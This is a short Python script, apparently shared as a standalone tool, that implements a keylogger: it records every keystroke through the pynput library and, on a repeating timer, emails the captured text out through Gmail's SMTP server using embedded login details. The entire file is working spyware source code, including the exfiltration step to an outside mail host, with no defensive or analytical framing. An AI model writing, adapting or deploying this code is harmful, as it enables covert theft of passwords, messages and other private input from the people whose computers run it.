from pynput import keyboard
import threading
import smtplib

class Keylogger():


    def __init__(self,time_interval,email,password):
        self.time_interval = time_interval
        self.email = email
        self.password = password
        self.log = "Keylogger started"

#this method appends the prevoius keystroke with the next
    def aappend_to_log(self,string):
        self.log = self.log + string 


#this method is call back function for keyboard event listener and appends keystorkes
    def process_key_press(self,key):         
        try:
            current_key = str(key.char)      
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.aappend_to_log(current_key)        

#this method is used to print keystrokes through threading after every second you provide
    def report(self):
        self.send_mail(self.email,self.password,self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval,self.report)
        timer.start()
# this method creates an instance of keyboard event listener              
    def start(self):
        key_logger = keyboard.Listener(on_press=self.process_key_press) 
        with key_logger:  
            self.report()
            key_logger.join()

    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(self.email,self.password)
        server.sendmail(self.email,self.email,message)
        server.quit()

logger = Keylogger(5,"email","passowrd")  #time interval should be a minimum of 5-10 minutes
logger.start()            